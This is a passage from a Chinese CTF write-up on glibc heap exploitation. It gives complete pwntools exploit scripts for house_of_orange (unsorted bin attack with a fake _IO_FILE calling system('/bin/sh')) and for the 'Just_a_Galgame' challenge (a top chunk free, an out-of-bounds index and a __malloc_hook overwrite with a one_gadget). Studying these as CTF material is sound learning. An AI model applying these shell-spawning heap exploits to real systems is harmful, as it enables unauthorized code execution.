    context(log_level='debug',arch='amd64')
    local=1
    binary_name='houseoforange_hitcon_2016'
    if local:
      p=process("./"+binary_name)
      e=ELF("./"+binary_name)
      libc=e.libc
    else:
      p=remote('node3.buuoj.cn',27493)
      e=ELF("./"+binary_name)
      libc=ELF("libc-2.23.so")
    def z(a=''):
      if local:
        gdb.attach(p,a)
        if a=='':
          raw_input
      else:
        pass
    ru=lambda x:p.recvuntil(x)
    rc=lambda x:p.recv(x)
    sl=lambda x:p.sendline(x)
    sd=lambda x:p.send(x)
    sla=lambda a,b:p.sendlineafter(a,b)
    ia=lambda : p.interactive()
    def add(size,name,price=1,color=1):
      ru("Your choice : ")
      sl('1')
      ru("Length of name :")
      sl(str(size))
      ru("Name :")
      sd(name)
      ru("Price of Orange:")
      sl(str(price))
      ru("Color of Orange:")
      sl(str(color))
    def show():
      ru("Your choice : ")
      sl('2')
    def edit(size,name,price=1,color=0xddaa):
      ru("Your choice : ")
      sl('3')
      ru("Length of name :")
      sl(str(size))
      ru("Name:")
      sd(name)
      ru("Price of Orange:")
      sl(str(price))
      ru("Color of Orange:")
      sl(str(color))
    add(0x10,'a')
    payload='a'*0x18+p64(0x21)+p32(1)+p32(0x1f)+p64(0)*2+p64(0xfa1)
    edit(len(payload),payload)
    add(0x1000,'a')
    add(0x400,'a')
    z()
    show()
    libcbase=u64(ru('\x7f')[-6:].ljust(8,'\x00'))-1601-0x3c4b20
    print hex(libcbase)
    edit(0x10,'a'*16)
    #z()
    show()
    rc(0x20)
    heapbase=u64(rc(6).ljust(8,'\x00'))-0xc0
    print hex(heapbase)
    _IO_list_all=libcbase+libc.sym['_IO_list_all']
    system=libcbase+libc.sym['system']
    payload='a'*0x400+p64(0)+p64(0x21)+'a'*0x10
    fake_file='/bin/sh\x00'+p64(0x60)
    fake_file+=p64(0)+p64(_IO_list_all-0x10)#unsorted bin attack
    fake_file+=p64(0)+p64(1)#IO_write_ptr>IO_write_base
    fake_file=fake_file.ljust(0xc0,'\x00')#_mode=0
    payload+=fake_file
    payload+=p64(0)*3+p64(heapbase+0x5c8)
    payload+=p64(0)*2+p64(system)
    #z()
    edit(0x800,payload)
    #z()
    ru(':')
    sl('1')
    ia()
###  5、例题（Just_a_Galgame）
house of orange的组合漏洞一般只在低于libc-2.27的版本才奏效，但是house of orange中free top
chunk的手法还是可以继续使用的，下面这题就是在libc-2.27的情况下free top chunk的情况。比赛的时候给的提示是house of
orange，但其实和house of orange有关就只有free top chunk
House of orange泄露libc+数组越界漏洞
libc很快就泄露出来了，但是数组越界漏洞一直没看出来，还以为是2.23下house of
orange的组合利用，需要劫持虚表，浪费了好多时间，最后还是没有做出来，看了wp才知道自己傻了，果然逆向的能力需要再提升一下
**1、常规检查**
虽然没有PIE，但是full RELRO，所以无法修改got表
**2、IDA分析**
所有的功能都在main函数里实现了，没有分开成函数写，一个个来看
  * add函数
固定只能申请0x68的chunk，没有什么漏洞
  * edit函数
这个函数非常关键，漏洞都在这里，首先第一眼可以看到read这里存在堆溢出漏洞，因为我们申请的chunk大小固定0x68，可以修改下一个chunk的chunk
head。
然后如果再看得仔细一点会发现，这里对idx的并没有做过多的检查，它只是检查了一下堆指针数组idx的那个位置有没有内容，如果有就可以往里写，没有检查idx是不是小于6，所以这里存在一个数组越界漏洞。
  * addbig函数
就是申请一个0x1000大小的chunk，是用来free top chunk的
  * show函数
将堆中的内容打印出来
  * leave函数
这个函数也很关键，一开始我以为没啥用，之后觉得有用，但是不会用orz。
可以看到这里允许我们向0x4040a0这个地址写入一个8字节的内容，8字节，，，可以写一个地址，然后0x4040a0这个地址有点眼熟，往上看发现，堆指针数组地址是0x404060，两个地址非常接近
**3、利用思路**
首先可以看到没有free函数，所以只能通过free top chunk来达到free的目的，edit函数允许我们修改top
chunk的size，然后又有addbig函数可以申请0x1000的chunk，所以将top chunk放到unsorted
bin的条件全部达成。又提供了show函数，所以我们可以直接泄露libc地址。
接下来就是比较骚的操作了，首先通过leave函数将malloc
hook-0x60的地址写入到0x4040a0的地址中，然后因为edit函数存在数组越界漏洞，所以我们edit（8），0x404060+8*8=0x4040a0，if语句会判断这个地址是否有内容，而我们刚刚通过leave函数已经将malloc
hook-0x60的地址写入0x4040a0，所以if满足，我们可以向malloc hook-0x60+0x60的地址写入内容，将one
gadget写入，在执行add，getshell
**EXP：**
    from pwn import *
    context.log_level='debug'
    p=process("./Just_a_Galgame")
    #p=remote('123.56.170.202',52114)
    e=ELF("./Just_a_Galgame")
    libc=ELF('libc-2.27.so')
    def add():
      p.recvuntil(">> ")
      p.sendline('1')
    def edit(idx,content):
      p.recvuntil(">> ")
      p.sendline('2')
      p.recvuntil("idx >> ")
      p.sendline(str(idx))
      p.recvuntil("movie name >> ")
      p.sendline(content)
    def addb():
      p.recvuntil(">> ")
      p.sendline('3')
    def show(idx):
      p.recvuntil(">> ")
      p.sendline('4')
      p.recvuntil("Reciew your cgs >> \n")
      p.sendline(str(idx))
    def leave(content):
      p.recvuntil(">> ")
      p.sendline('5')
      p.recvuntil("\nHotaru: Won't you stay with me for a while? QAQ\n\n")
      p.send(content)
    add()#0
    payload=p64(0)+p64(0xd41)
    edit(0,payload)
    addb()
    add()#1
    #gdb.attach(p)
    show(1)
    main_arena=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-1632
    print hex(main_arena)
    libcbase=main_arena-0x3ebc40
    print hex(libcbase)
    one_gadget=libcbase+0x4f3c2
    malloc_hook=libcbase+libc.sym['__malloc_hook']
    leave(p64(malloc_hook-0x60))
    edit(8,p64(one_gadget))
    add()
    p.interactive()
参考链接：